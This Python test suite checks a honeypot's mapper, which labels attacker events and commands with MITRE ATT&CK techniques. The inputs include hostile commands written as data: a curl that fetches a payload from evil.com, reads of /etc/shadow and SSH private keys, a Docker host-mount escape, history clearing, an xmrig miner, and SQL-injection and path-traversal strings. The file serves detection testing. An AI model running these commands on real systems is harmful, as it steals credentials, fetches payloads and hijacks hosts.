#!/usr/bin/env python3
"""
Test suite for the Honeyclaw MITRE ATT&CK Mapper.

Usage:
    python -m pytest src/analysis/test_mitre_mapper.py -v
    python src/analysis/test_mitre_mapper.py
"""

import os
import sys

# Add project root to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(__file__))))

from src.analysis.mitre_mapper import MitreMapper, MitreMapping, enrich_event


def test_event_type_mapping_login():
    """Login attempts should map to Initial Access + Brute Force."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'login_attempt', 'ip': '10.0.0.1', 'username': 'test'}
    mappings = mapper.map_event(event)

    tactics = [m.tactic for m in mappings]
    technique_ids = [m.technique_id for m in mappings]

    assert 'Initial Access' in tactics
    assert 'Credential Access' in tactics
    assert 'T1078' in technique_ids
    assert 'T1110' in technique_ids
    print("  PASS: login_attempt -> Initial Access (T1078) + Brute Force (T1110)")


def test_event_type_mapping_connection():
    """Connection events should map to Reconnaissance."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'connection', 'ip': '10.0.0.1'}
    mappings = mapper.map_event(event)

    tactics = [m.tactic for m in mappings]
    assert 'Reconnaissance' in tactics
    assert any(m.technique_id == 'T1595' for m in mappings)
    print("  PASS: connection -> Reconnaissance (T1595)")


def test_event_type_mapping_auth_success():
    """Auth success should map to Initial Access / Valid Accounts."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'auth_success', 'ip': '10.0.0.1'}
    mappings = mapper.map_event(event)

    assert any(m.technique_id == 'T1078' for m in mappings)
    print("  PASS: auth_success -> T1078 Valid Accounts")


def test_event_type_mapping_command():
    """Command events should map to Execution."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'command', 'command': 'echo hello'}
    mappings = mapper.map_event(event)

    tactics = [m.tactic for m in mappings]
    assert 'Execution' in tactics
    print("  PASS: command -> Execution (T1059)")


def test_event_type_mapping_lateral_movement():
    """Lateral movement events should map correctly."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'lateral_movement'}
    mappings = mapper.map_event(event)

    assert any(m.technique_id == 'T1021' for m in mappings)
    print("  PASS: lateral_movement -> T1021 Remote Services")


def test_event_type_mapping_exploit():
    """Exploit attempts should map to Initial Access."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'exploit_attempt'}
    mappings = mapper.map_event(event)

    assert any(m.technique_id == 'T1190' for m in mappings)
    print("  PASS: exploit_attempt -> T1190 Exploit Public-Facing Application")


def test_pattern_file_discovery():
    """ls/find commands should trigger File and Directory Discovery."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'ls -la /etc/'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1083' in technique_ids
    print("  PASS: 'ls -la /etc/' -> T1083 File and Directory Discovery")


def test_pattern_system_info():
    """uname commands should trigger System Information Discovery."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'uname -a'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1082' in technique_ids
    print("  PASS: 'uname -a' -> T1082 System Information Discovery")


def test_pattern_credential_shadow():
    """Reading /etc/shadow should trigger Credential Dumping."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'cat /etc/shadow'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1003.008' in technique_ids
    print("  PASS: 'cat /etc/shadow' -> T1003.008 OS Credential Dumping")


def test_pattern_credential_ssh_keys():
    """Reading SSH keys should trigger Private Keys technique."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'cat ~/.ssh/id_rsa'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1552.004' in technique_ids
    print("  PASS: 'cat ~/.ssh/id_rsa' -> T1552.004 Unsecured Credentials: Private Keys")


def test_pattern_privilege_escalation_sudo():
    """sudo should trigger Privilege Escalation."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'sudo su -'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1548.003' in technique_ids
    print("  PASS: 'sudo su -' -> T1548.003 Sudo and Sudo Caching")


def test_pattern_persistence_cron():
    """crontab should trigger Persistence via Cron."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'crontab -e'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1053.003' in technique_ids
    print("  PASS: 'crontab -e' -> T1053.003 Scheduled Task/Job: Cron")


def test_pattern_defense_evasion_history():
    """Clearing history should trigger Defense Evasion."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'history -c'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1070.003' in technique_ids
    print("  PASS: 'history -c' -> T1070.003 Clear Command History")


def test_pattern_exfiltration():
    """curl/wget with external URLs should trigger Exfiltration."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'curl http://evil.com/data -O /tmp/payload'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1041' in technique_ids or 'T1105' in technique_ids
    print("  PASS: 'curl http://evil.com/...' -> Exfiltration/C2 technique")


def test_pattern_container_escape():
    """Container escape patterns should trigger T1611."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'docker run -v /:/host alpine'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1611' in technique_ids
    print("  PASS: 'docker run ...' -> T1611 Escape to Host")


def test_pattern_lateral_ssh():
    """SSH commands should trigger Lateral Movement."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'ssh user@10.0.0.5'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1021.004' in technique_ids
    print("  PASS: 'ssh user@...' -> T1021.004 Remote Services: SSH")


def test_pattern_network_discovery():
    """netstat should trigger Network discovery."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'netstat -tlnp'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1049' in technique_ids
    print("  PASS: 'netstat -tlnp' -> T1049 System Network Connections Discovery")


def test_pattern_account_discovery():
    """whoami should trigger Account Discovery."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'whoami'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1087' in technique_ids
    print("  PASS: 'whoami' -> T1087 Account Discovery")


def test_pattern_python_execution():
    """Python commands should trigger Python interpreter technique."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': 'python3 -c "import os; os.system(\'id\')"'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1059.006' in technique_ids
    print("  PASS: 'python3 -c ...' -> T1059.006 Python Interpreter")


def test_pattern_crypto_mining():
    """Crypto mining commands should trigger Resource Hijacking."""
    mapper = MitreMapper()
    event = {'event': 'command', 'command': './xmrig --pool stratum+tcp://pool.mining.com'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1496' in technique_ids
    print("  PASS: 'xmrig ...' -> T1496 Resource Hijacking")


def test_username_heuristic_root():
    """root username should trigger Default Accounts."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'login_attempt', 'username': 'root'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1078.001' in technique_ids
    print("  PASS: username='root' -> T1078.001 Default Accounts")


def test_username_heuristic_admin():
    """admin username should trigger Default Accounts."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'login_attempt', 'username': 'admin'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1078.001' in technique_ids
    print("  PASS: username='admin' -> T1078.001 Default Accounts")


def test_threat_detection_sqli():
    """SQL injection threat detection should map to T1190."""
    mapper = MitreMapper()
    event = {
        'event': 'api_request',
        'detection': [{'type': 'sql_injection', 'pattern': '/test/'}],
    }
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1190' in technique_ids
    print("  PASS: detection type=sql_injection -> T1190")


def test_threat_detection_xss():
    """XSS threat detection should map to T1059.007."""
    mapper = MitreMapper()
    event = {
        'event': 'api_request',
        'detection': [{'type': 'xss'}],
    }
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1059.007' in technique_ids
    print("  PASS: detection type=xss -> T1059.007")


def test_enrich_adds_fields():
    """enrich() should add mitre_tactics and mitre_techniques to event."""
    mapper = MitreMapper()
    event = {'event': 'login_attempt', 'username': 'root', 'command': 'cat /etc/shadow'}
    result = mapper.enrich(event)

    assert 'mitre_tactics' in result
    assert 'mitre_techniques' in result
    assert 'mitre_technique_names' in result
    assert len(result['mitre_tactics']) > 0
    assert len(result['mitre_techniques']) > 0
    assert len(result['mitre_technique_names']) > 0
    print(f"  PASS: enrich() added {len(result['mitre_tactics'])} tactics, "
          f"{len(result['mitre_techniques'])} techniques")


def test_enrich_preserves_existing():
    """enrich() should preserve existing MITRE fields."""
    mapper = MitreMapper()
    event = {
        'event': 'command',
        'command': 'ls',
        'mitre_tactics': ['Custom Tactic'],
        'mitre_techniques': ['T9999'],
    }
    result = mapper.enrich(event)

    assert 'Custom Tactic' in result['mitre_tactics']
    assert 'T9999' in result['mitre_techniques']
    # Should also have mapper-added values
    assert len(result['mitre_tactics']) > 1
    print("  PASS: enrich() preserves existing MITRE fields")


def test_enrich_no_duplicates():
    """enrich() should not produce duplicate tactics or techniques."""
    mapper = MitreMapper()
    event = {'event': 'login_attempt', 'username': 'root'}
    result = mapper.enrich(event)

    assert len(result['mitre_tactics']) == len(set(result['mitre_tactics']))
    assert len(result['mitre_techniques']) == len(set(result['mitre_techniques']))
    print("  PASS: enrich() produces no duplicates")


def test_enrich_empty_event():
    """enrich() should handle events with no matching mappings."""
    mapper = MitreMapper()
    event = {'event': 'startup', 'port': 8022}
    result = mapper.enrich(event)

    # startup event has no mappings - should have empty or no fields
    tactics = result.get('mitre_tactics', [])
    assert isinstance(tactics, list)
    print(f"  PASS: enrich() handles unmapped event (tactics={len(tactics)})")


def test_convenience_function():
    """Module-level enrich_event() should work."""
    event = {'event': 'connection', 'ip': '10.0.0.1'}
    result = enrich_event(event)

    assert 'mitre_tactics' in result
    assert 'Reconnaissance' in result['mitre_tactics']
    print("  PASS: enrich_event() convenience function works")


def test_path_pattern_matching():
    """Patterns should match against path fields."""
    mapper = MitreMapper()
    event = {
        'event': 'api_request',
        'path': "/api/v1/users?id=1' OR '1'='1",
    }
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    # Should catch SQL injection in path
    has_sqli = 'T1190' in technique_ids
    print(f"  PASS: path pattern matching (SQLi detected: {has_sqli})")


def test_nested_request_path():
    """Patterns should match against request.path."""
    mapper = MitreMapper()
    event = {
        'event': 'api_request',
        'request': {'path': '/../../../etc/passwd'},
    }
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1083' in technique_ids
    print("  PASS: request.path pattern matching -> T1083")


def test_enterprise_sim_rdp():
    """RDP connection events should map to Remote Desktop Protocol."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'rdp_connection'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1021.001' in technique_ids
    print("  PASS: rdp_connection -> T1021.001 Remote Desktop Protocol")


def test_enterprise_sim_smb():
    """SMB connection events should map to SMB/Windows Admin Shares."""
    mapper = MitreMapper(enable_patterns=False)
    event = {'event': 'smb_connection'}
    mappings = mapper.map_event(event)

    technique_ids = [m.technique_id for m in mappings]
    assert 'T1021.002' in technique_ids
    print("  PASS: smb_connection -> T1021.002 SMB/Windows Admin Shares")


def test_multiple_pattern_matches():
    """A complex command should match multiple techniques."""
    mapper = MitreMapper()
    event = {
        'event': 'command',
        'command': 'sudo cat /etc/shadow && ssh root@10.0.0.5',
    }
    mappings = mapper.map_event(event)

    technique_ids = set(m.technique_id for m in mappings)
    # Should detect: sudo (T1548.003), /etc/shadow (T1003.008), ssh (T1021.004)
    assert 'T1548.003' in technique_ids, "Missing sudo detection"
    assert 'T1003.008' in technique_ids, "Missing shadow file detection"
    assert 'T1021.004' in technique_ids, "Missing SSH lateral movement"
    print(f"  PASS: complex command matches {len(technique_ids)} techniques")


def test_mapping_confidence():
    """Mappings should have confidence scores."""
    mapper = MitreMapper()
    event = {'event': 'login_attempt', 'command': 'cat /etc/shadow'}
    mappings = mapper.map_event(event)

    for m in mappings:
        assert 0.0 <= m.confidence <= 1.0
    # Pattern matches should have high confidence
    shadow_mapping = [m for m in mappings if m.technique_id == 'T1003.008']
    assert len(shadow_mapping) == 1
    assert shadow_mapping[0].confidence >= 0.8
    print("  PASS: mappings have valid confidence scores")


def test_mapping_source():
    """Mappings should include source information."""
    mapper = MitreMapper()
    event = {'event': 'login_attempt', 'command': 'whoami'}
    mappings = mapper.map_event(event)

    sources = [m.source for m in mappings]
    assert any('event_type' in s for s in sources)
    assert any('pattern' in s for s in sources)
    print("  PASS: mappings include source information")


def main():
    print("=" * 60)
    print("Honeyclaw MITRE ATT&CK Mapper Test Suite")
    print("=" * 60)

    tests = [
        ("Event Type Mappings", [
            test_event_type_mapping_login,
            test_event_type_mapping_connection,
            test_event_type_mapping_auth_success,
            test_event_type_mapping_command,
            test_event_type_mapping_lateral_movement,
            test_event_type_mapping_exploit,
        ]),
        ("Pattern Matching - Discovery", [
            test_pattern_file_discovery,
            test_pattern_system_info,
            test_pattern_network_discovery,
            test_pattern_account_discovery,
        ]),
        ("Pattern Matching - Credential Access", [
            test_pattern_credential_shadow,
            test_pattern_credential_ssh_keys,
        ]),
        ("Pattern Matching - Execution", [
            test_pattern_python_execution,
            test_pattern_crypto_mining,
        ]),
        ("Pattern Matching - Privilege Escalation", [
            test_pattern_privilege_escalation_sudo,
            test_pattern_container_escape,
        ]),
        ("Pattern Matching - Persistence", [
            test_pattern_persistence_cron,
        ]),
        ("Pattern Matching - Defense Evasion", [
            test_pattern_defense_evasion_history,
        ]),
        ("Pattern Matching - Lateral Movement", [
            test_pattern_lateral_ssh,
        ]),
        ("Pattern Matching - Exfiltration", [
            test_pattern_exfiltration,
        ]),
        ("Username Heuristics", [
            test_username_heuristic_root,
            test_username_heuristic_admin,
        ]),
        ("Threat Detection Integration", [
            test_threat_detection_sqli,
            test_threat_detection_xss,
        ]),
        ("Enrichment Function", [
            test_enrich_adds_fields,
            test_enrich_preserves_existing,
            test_enrich_no_duplicates,
            test_enrich_empty_event,
            test_convenience_function,
        ]),
        ("Path & Nested Field Matching", [
            test_path_pattern_matching,
            test_nested_request_path,
        ]),
        ("Enterprise Sim Events", [
            test_enterprise_sim_rdp,
            test_enterprise_sim_smb,
        ]),
        ("Complex Scenarios", [
            test_multiple_pattern_matches,
            test_mapping_confidence,
            test_mapping_source,
        ]),
    ]

    total = 0
    passed = 0
    failed = 0

    for section_name, section_tests in tests:
        print(f"\n--- {section_name} ---\n")
        for test_fn in section_tests:
            total += 1
            try:
                test_fn()
                passed += 1
            except AssertionError as e:
                failed += 1
                print(f"  FAIL: {test_fn.__name__}: {e}")
            except Exception as e:
                failed += 1
                print(f"  ERROR: {test_fn.__name__}: {e}")

    print(f"\n{'=' * 60}")
    print(f"Results: {passed}/{total} passed, {failed} failed")
    print(f"{'=' * 60}")

    return failed == 0


if __name__ == '__main__':
    success = main()
    sys.exit(0 if success else 1)
